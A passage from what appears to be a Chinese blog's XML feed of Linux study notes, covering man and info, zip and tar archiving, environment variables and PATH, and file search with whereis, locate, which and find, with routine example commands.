class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="man命令">man命令</h3><ul><li><p><code>man</code>命令得到的内容比<code>help</code>更多更详细，而且<code>man</code>没有内建命令与外部命令的区分。<code>man</code>命令是显示系统手册页中的内容，通常为对命令的解释信息和相关描述。</p></li><li><p>使用<code>man</code>命令得到的内容第一行会显示出该命令在文档中所处的章节位置，如使用<code>man ls</code>，则会显示<code>LS(1)</code>，其中<code>LS</code>为手册名称，<code>(1)</code>表示位于该手册的第几章节。在<code>man</code>手册中一共有如下章节：</p></li></ul><table><thead><tr><th style="text-align:center">章节数</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>1</code></td><td style="text-align:center">Standard commands （标准命令）</td></tr><tr><td style="text-align:center"><code>2</code></td><td style="text-align:center">System calls （系统调用）</td></tr><tr><td style="text-align:center"><code>3</code></td><td style="text-align:center">Library functions （库函数）</td></tr><tr><td style="text-align:center"><code>4</code></td><td style="text-align:center">Special devices （设备说明）</td></tr><tr><td style="text-align:center"><code>5</code></td><td style="text-align:center">File formats （文件格式）</td></tr><tr><td style="text-align:center"><code>6</code></td><td style="text-align:center">Games and toys （游戏和娱乐）</td></tr><tr><td style="text-align:center"><code>7</code></td><td style="text-align:center">Miscellaneous （杂项）</td></tr><tr><td style="text-align:center"><code>8</code></td><td style="text-align:center">Administrative Commands （管理员命令）</td></tr><tr><td style="text-align:center"><code>9</code></td><td style="text-align:center">其他（Linux特定的）， 用来存放内核例行程序的文档</td></tr></tbody></table><h3 id="info命令">info命令</h3><ul><li><p>如果环境中没有<code>info</code>命令，那么可以自行手动安装：</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 info</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> update</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="built_in">info</span></span><br><span class="line"><span class="comment"># 查看 ls 命令的 info</span></span><br><span class="line"><span class="built_in">info</span> ls</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件打包与解压缩</title>
      <link href="/posts/c67b19b2.html"/>
      <url>/posts/c67b19b2.html</url>
      
        <content type="html"><![CDATA[<h2 id="压缩打包程序">压缩打包程序</h2><h3 id="使用zip打包文件夹">使用zip打包文件夹</h3><ul><li><p>使用<code>zip</code>命令可以将文件夹打包，比如使用下面的命令将目录<code>/home/shiyanlou/Desktop</code>打包成一个文件，并查看打包后文件的大小和类型，其中<code>-r</code>参数表示递归打包包含子目录的全部内容，<code>-q</code>参数表示为安静模式，即不输出信息到屏幕，<code>-o</code>表示输出文件，在后面紧跟上输出的文件名称：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~</span><br><span class="line"><span class="keyword">zip</span> -r -q -o shiyanlou.<span class="keyword">zip</span> /home/shiyanlou/Desktop</span><br><span class="line">du -<span class="keyword">h</span> shiyanlou.<span class="keyword">zip</span></span><br><span class="line"><span class="keyword">file</span> shiyanlou.<span class="keyword">zip</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013221318522.png" alt="image-20231013221318522"></p></li><li><p>为打包设置压缩级别（9：最高压缩度，速度最慢；1：最快速度，压缩率低），进行重新打包：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip -r -<span class="number">9</span> -q -o shiyanlou_9.zip <span class="regexp">/home/</span>shiyanlou<span class="regexp">/Desktop -x ~/</span>*.zip</span><br><span class="line">zip -r -<span class="number">1</span> -q -o shiyanlou_1.zip <span class="regexp">/home/</span>shiyanlou<span class="regexp">/Desktop -x ~/</span>*.zip</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013221533479.png" alt="image-20231013221533479"></p></li><li><p>使用<code>du</code>命令再次查看压缩得到的文件，其中<code>-h</code>为以人可读的形式展现，<code>-d</code>表示查看文件的深度：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">du</span> -h -d <span class="number">0</span> <span class="regexp">*.zip</span> <span class="regexp">~ |</span> sort</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013221602101.png" alt="image-20231013221602101"></p></li><li><p>注意：压缩文件使用的路径只能使用绝对路径，否则不起作用。理论上默认压缩级别是最高的，但在文件较小时难以看出差别。</p></li><li><p>由于WIndows和Linux/Unix在文本处理格式上存在差异，比如换行符，WIndows上为<code>CR+LF</code>，但Linux/Unix上为<code>LF</code>，所以一些在Linux/Unix上的换行在Windows系统上看起来像是没有换行，为了解决此类问题，还需要在命令中做出一些修改，加上<code>-l</code>参数将<code>LF</code>转换为<code>CR+LF</code>达到上述目的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r -l -o shiyanlou.zip <span class="regexp">/home/</span>shiyanlou/Desktop</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013221943861.png" alt="image-20231013221943861"></p></li></ul><h3 id="创建加密zip包">创建加密zip包</h3><ul><li><p>在打包文件时添加上<code>-e</code>参数可以创建加密压缩包：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r -e -o shiyanlou_encryption.zip <span class="regexp">/home/</span>shiyanlou/Desktop</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222055429.png" alt="image-20231013222055429"></p></li></ul><h2 id="解压缩打包程序">解压缩打包程序</h2><h3 id="解压缩文件">解压缩文件</h3><ul><li><p>将之前打包的<code>shiyanlou.zip</code>解压到当前目录下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">unzip</span> shiyanlou.zip</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222137966.png" alt="image-20231013222137966"></p></li><li><p>与之前相同，使用<code>-q</code>参数使用安静模式解压文件，而使用<code>-d</code>参数指定解压目录：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -<span class="selector-tag">q</span> shiyanlou<span class="selector-class">.zip</span> -d ziptest</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222224693.png" alt="image-20231013222224693"></p></li><li><p>如果上面指定的目录不存在，则会直接创建。</p></li><li><p>如果只想查看压缩包的内容，而不进行解压操作，可以使用<code>-l</code>参数：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">unzip</span> -l shiyanlou.zip</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222521006.png" alt="image-20231013222521006"></p></li></ul><h3 id="解决解压乱码问题">解决解压乱码问题</h3><ul><li><p>通常在Windows系统上创建的压缩文件，如果包名中含有中文的目录或者以中文作为文件名命名的文件，通常会采用GBK编码，而Linux则是默认使用哪个UTF-8编码，如果不加以处理直接解压，则会出现乱码问题，可以在解压缩时使用<code>-O</code>参数指定文件编码：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -O GBK 压缩文件<span class="string">.zip</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="tar打包工具">tar打包工具</h2><h3 id="打包">打包</h3><ul><li><p>比起<code>zip</code>，在Lin上更常使用的是<code>tar</code>工具，<code>tar</code>可以将7z、gzip、xz、bzip2等格式进行打包或者解包，仅仅是参数不同，比起<code>zip</code>使用较为方便。</p></li><li><p>创建一个tar包，使用<code>-P</code>参数保留绝对路径符，<code>-c</code>表示创建一个tar包文件，<code>-f</code>用于指定创建的文件名，其后紧跟文件名称，如果加上<code>-v</code>参数，那么会以可视的形式输出打包的文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -P -cf shiyanlou.tar <span class="regexp">/home/</span>shiyanlou/Desktop</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222601275.png" alt="image-20231013222601275"></p><blockquote><p>在使用多个参数时，可以使用连续书写方式：如同时使用<code>-c</code>与<code>-f</code>参数 ，则可以写成<code>-cf</code></p></blockquote></li></ul><h3 id="解包">解包</h3><ul><li><p>同样是使用<code>tar</code>命令，加上<code>-x</code>参数则是对文件进行解包，<code>-C</code>参数指定解压到的目标文件夹：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir tardir</span><br><span class="line">tar -xf shiyanlou.tar -C tardir</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013222938219.png" alt="image-20231013222938219"></p></li><li><p>只查看而不解压文件使用<code>-t</code>参数：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tar</span> -tf shiyanlou.tar</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013223001893.png" alt="image-20231013223001893"></p></li><li><p>如果需要在解压时保留文件的属性和跟随链接（符号链接或软连接）可以使用<code>-p</code>参数和<code>-h</code>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cphf etc.tar /etc</span><br></pre></td></tr></table></figure></li></ul><h3 id="创建其他形式的打包程序">创建其他形式的打包程序</h3><table><thead><tr><th style="text-align:center">压缩文件格式</th><th style="text-align:center">参数</th></tr></thead><tbody><tr><td style="text-align:center"><code>*.tar.gz</code></td><td style="text-align:center"><code>-z</code></td></tr><tr><td style="text-align:center"><code>*.tar.xz</code></td><td style="text-align:center"><code>-J</code></td></tr><tr><td style="text-align:center"><code>*tar.bz2</code></td><td style="text-align:center"><code>-j</code></td></tr></tbody></table><ul><li><p>比如创建<code>.tar.gz</code>文件，加上<code>-z</code>参数：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czf shiyanlou.tar.gz <span class="regexp">/home/</span>shiyanlou/Desktop</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013223140457.png" alt="image-20231013223140457"></p></li><li><p>解压<code>.tar.gz</code>文件：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tar</span> -xzf shiyanlou.tar.gz</span><br></pre></td></tr></table></figure></li></ul><h2 id="实战训练">实战训练</h2><blockquote><p>创建一个名为 test 的文件，分别用 zip 和 tar 打包成压缩包，再解压到 /home/shiyanlou 目录。</p></blockquote><ul><li><p>创建一个名为 test 的文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013223345818.png" alt="image-20231013223345818"></p></li><li><p>分别用 zip 和 tar 打包成压缩包：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">zip</span> -q -o <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br><span class="line">tar -P -<span class="keyword">cf</span> <span class="keyword">test</span>.tar <span class="keyword">test</span></span><br><span class="line"><span class="keyword">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013230521245.png" alt="image-20231013230521245"></p></li><li><p>再解压到 /home/shiyanlou 目录:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ~</span><br><span class="line">unzip <span class="keyword">test</span>.<span class="keyword">zip</span></span><br><span class="line">tar -xf <span class="keyword">test</span>.tar</span><br></pre></td></tr></table></figure><p><img src="https://oss.iuoyt.com/img/posts/image-20231013230641542.png" alt="image-20231013230641542"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux环境变量与文件查找</title>
      <link href="/posts/287535e7.html"/>
      <url>/posts/287535e7.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境变量">环境变量</h2><h3 id="环境变量-2">环境变量</h3><h4 id="变量">变量</h4><ul><li><p>在Shell中创建一个变量可以使用<code>declare</code>命令，但并非任何形式的变量名都是可用的，变量名只能是由英文字母、数字或者下划线组成，且不能由数字开头。比如创建一个tmp变量：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> tmp</span><br></pre></td></tr></table></figure></li><li><p>使用<code>=</code>运算符为变量赋值：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tmp</span><span class="operator">=</span>shiyanlou</span><br></pre></td></tr></table></figure></li><li><p>使用<code>echo</code>和<code>$</code>符号可以查看变量的值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$tmp</span></span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008230724020.png" alt="image-20231008230724020"></p></li></ul><h4 id="环境变量-3">环境变量</h4><ul><li><p>环境变量的作用域比自定义变量要大，比如Shell的环境变量作用于自身和它的子进程</p></li><li><p>有三个和环境变量相关的命令，<code>set</code>、<code>env</code>和<code>export</code>。这三个命令很相似，都是用于打印环境变量信息，区别在于涉及的变量范围不同。</p></li></ul><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>set</code></td><td style="text-align:center">显示当前Shell所有变量，包括内建环境变量、用户自定义变量及导出的环境变量</td></tr><tr><td style="text-align:center"><code>env</code></td><td style="text-align:center">显示与当前用户相关的环境变量，还可以让命令在指定环境中运行</td></tr><tr><td style="text-align:center"><code>export</code></td><td style="text-align:center">显示从Shell中导出成环境变量的变量，能通过它将自定义变量导出为环境变量</td></tr></tbody></table><p><img src="https://doc.shiyanlou.com/linux_base/5-3.png" alt="img"></p><ul><li><p>用<code>export</code>来体验一下环境变量与普通变量的，先在Shell中设置一个变量<code>temp=shiyanlou</code>，然后创建一个子Shell查看temp变量的值：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">temp=shiyanlou</span><br><span class="line">echo <span class="variable">$temp</span></span><br><span class="line">zsh</span><br><span class="line">echo <span class="variable">$temp</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">export temp</span><br><span class="line">zsh</span><br><span class="line">echo <span class="variable">$temp</span></span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008230934536.png" alt="image-20231008230934536"></p></li><li><p>通常为了与普通变量区分，习惯将环境变量名都设为大写</p></li></ul><h4 id="永久生效">永久生效</h4><ul><li><p>在关机之后，或者关闭shell，环境变量就会消失，可以将变量写入存放变量的文件中：<code>/etc/bashrc</code>和<code>/etc/profile</code>，分别存放的是shell变量和环境变量，或者用户目录下的隐藏文件<code>.profile</code>，仅对当前用户生效，可以使用<code>ls -a</code>查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008231056722.png" alt=".profile文件"></p></li></ul><h3 id="命令的查找路径与顺序">命令的查找路径与顺序</h3><ul><li><p>在Shell中命令的执行是通过环境变量<code>PATH</code>搜索的，查看<code>PATH</code>环境变量的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008231225585.png" alt="image-20231008231225585"></p></li><li><p>系统会从PATH中以此查找，如果存在相同的命令，则执行先找到的那个</p></li><li><p>接下来创建一个最简单的可执行Shell脚本和使用C语言创建的程序：</p><ul><li><p>在家目录创建一个<code>mybin</code>目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> mybin</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008231345401.png" alt="image-20231008231345401"></p></li><li><p>进入新创建的目录，创建一个Shell脚本文件并编辑：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> mybin</span><br><span class="line">touch hello_shell.<span class="keyword">sh</span></span><br><span class="line">gedit hello_shell.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><blockquote><p>如果遇到gedit提示：[Unable to init server: 无法连接： 拒绝连接]，可以使用如下命令解决：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">DISPLAY</span>=localhost:1</span><br><span class="line">xhost local:gedit</span><br></pre></td></tr></table></figure><p>若出现以下内容，表示问题解决：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">non-network <span class="keyword">local</span> connections being added <span class="keyword">to</span> <span class="keyword">access</span> control list</span><br></pre></td></tr></table></figure><p>若还无法解决，可以使用vim编辑器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> hello_shell.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>在脚本中写入如下内容（第一行不可省略）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++));<span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;hello shell&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure></li><li><p>为文件添加可执行权限：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">755</span> hello_shell.sh</span><br></pre></td></tr></table></figure></li><li><p>执行脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hello_shell.sh</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008233557594.png" alt="image-20231008233557594"></p></li><li><p>创建一个C语言程序并编辑：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch hello_world.<span class="keyword">c</span></span><br><span class="line">gedit hello_world.<span class="keyword">c</span></span><br></pre></td></tr></table></figure></li><li><p>写入如下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后使用<code>gcc</code>生成可执行文件：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello_world hello_world.<span class="keyword">c</span></span><br></pre></td></tr></table></figure></li><li><p>运行程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hello_world</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008233742246.png" alt="image-20231008233742246"></p></li></ul></li><li><p>在返回到家目录后，如果再想运行刚才创建的两个程序，会提示命令找不到，除非加上命令的完整路径。如果希望可以像执行系统命令一样执行运行刚才创建的程序，可以将脚本文件添加到PATH环境变量中。</p></li></ul><h3 id="添加自定义路径到PATH环境变量">添加自定义路径到PATH环境变量</h3><ul><li><p>PATH路径是以<code>:</code>作为分隔符的，如果希望将上面的<code>mybin</code>目录加入PATH路径，则需要写入以下信息：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">PATH</span>=<span class="variable">$PATH</span><span class="symbol">:/home/shiyanlou/mybin</span></span><br></pre></td></tr></table></figure></li><li><p><strong>需要注意的是，这里一定要使用绝对路径</strong></p></li><li><p>那么现在就可以直接执行写下的两个命令了：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello<span class="emphasis">_shell.sh</span></span><br><span class="line"><span class="emphasis">hello_</span>world</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008233916073.png" alt="image-20231008233916073"></p></li><li><p>但给PATH追加一条路径只会在当前Shell有效，一旦退出终端，再打开就会发现又失效了，那么可以利用用户home目录中一个在启动shell时自动运行的脚本。zsh的配置文件为<code>.zshrc</code>，相应Bash的配置文件为<code>.bashrc</code>，使用命令将路径添加到<code>.zshrc</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=<span class="variable">$PATH</span>:/home/shiyanlou/mybin&quot;</span> &gt;&gt; .zshrc</span><br></pre></td></tr></table></figure><blockquote><p>上面命令中的<code>&gt;&gt;</code>表示将标准输出以追加的方式重定向到一个文件中。</p></blockquote></li></ul><h3 id="修改和删除已有变量">修改和删除已有变量</h3><h4 id="变量修改">变量修改</h4><ul><li>变量修改有如下几种方式：</li></ul><table><thead><tr><th style="text-align:center">变量设置方式</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">${变量名#匹配字串}</td><td style="text-align:center">从头向后开始匹配，删除符合匹配字串的最短数据</td></tr><tr><td style="text-align:center">${变量名##匹配字串}</td><td style="text-align:center">从头向后开始匹配，删除符合匹配字串的最长数据</td></tr><tr><td style="text-align:center">${变量名%匹配字串}</td><td style="text-align:center">从尾向前开始匹配，删除符合匹配字串的最短数据</td></tr><tr><td style="text-align:center">${变量名%%匹配字串}</td><td style="text-align:center">从尾向前开始匹配，删除符合匹配字串的最长数据</td></tr><tr><td style="text-align:center">${变量名/旧的字串/新的字串}</td><td style="text-align:center">将符合旧字串的第一个字串替换为新的字串</td></tr><tr><td style="text-align:center">${变量名//旧的字串/新的字串}</td><td style="text-align:center">将符合旧字串的全部字串替换为新的字串</td></tr></tbody></table><ul><li><p>比如要修改前面添加到PATH的环境变量，为了避免误操作导致命令找不到，我们先将PATH赋值给一个新定义的自定义变量：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">path</span>=$<span class="built_in">PATH</span></span><br><span class="line"><span class="built_in">echo</span> $<span class="built_in">path</span></span><br><span class="line"><span class="built_in">path</span>=$&#123;<span class="built_in">path</span><span class="variable">%/home/shiyanlou/mybin&#125;</span></span><br><span class="line"><span class="variable">path=$&#123;path%</span>*/mybin&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="删除变量">删除变量</h4><ul><li><p>可以使用<code>unset</code>命令删除一个环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> temp</span><br></pre></td></tr></table></figure></li></ul><h3 id="让环境变量立刻生效">让环境变量立刻生效</h3><ul><li><p>在Shell中修改了一个配置脚本文件后，必须要退出终端重新启动才可以生效，如果希望立即生效，可以使用<code>source</code>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">source</span> .zshrc</span><br></pre></td></tr></table></figure></li><li><p><code>source</code>命令还有一个别名<code>.</code>，或者使用以下方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">. ./.zshrc</span><br></pre></td></tr></table></figure></li></ul><h2 id="搜索文件">搜索文件</h2><h3 id="whereis">whereis</h3><ul><li><p><code>whereis</code>搜索很快，因为并没有从硬盘中依次查找，而是从数据库中查询</p></li><li><p><code>whereis</code>只能搜索二进制文件（-b）、man帮助文件（-m）和源代码文件（-s）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis who</span><br><span class="line">whereis <span class="built_in">find</span></span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008234411280.png" alt="image-20231008234411280"></p></li></ul><h3 id="locate">locate</h3><ul><li><p>通过<code>/var/lib/mlocate/mlocate.db</code>数据库查找，但这个文件只会由系统每天自动执行<code>updatedb</code>命令更新一次</p></li><li><p>查找<code>/usr/share/</code>下的所有jpg文件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> install locate</span><br><span class="line">locate /usr/<span class="keyword">share</span>/\*.jpg</span><br></pre></td></tr></table></figure></li><li><p>如果只想统计数目可以加上<code>-c</code>参数，忽略大小写查找使用<code>-i</code>参数</p></li></ul><h3 id="which">which</h3><ul><li><p>which本身是Shell内建的一个命令，通常用来确定是否安装了某个指定的软件，因为其只通过PATH环境变量指定的路径中查找：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">which</span> <span class="keyword">man</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="find">find</h3><ul><li><p>find命令是四种查找中最强大的，格式为<code>find [path] [option] [action]</code></p></li><li><p>表示去 /etc/ 目录下面 ，搜索名字叫做 interfaces 的文件或者目录：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">find</span> <span class="regexp">/etc/</span> -name interfaces</span><br></pre></td></tr></table></figure></li></ul><h2 id="实战训练">实战训练</h2><ul><li><p>找出 /etc/ 目录下的所有以 .list 结尾的文件。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">find</span> <span 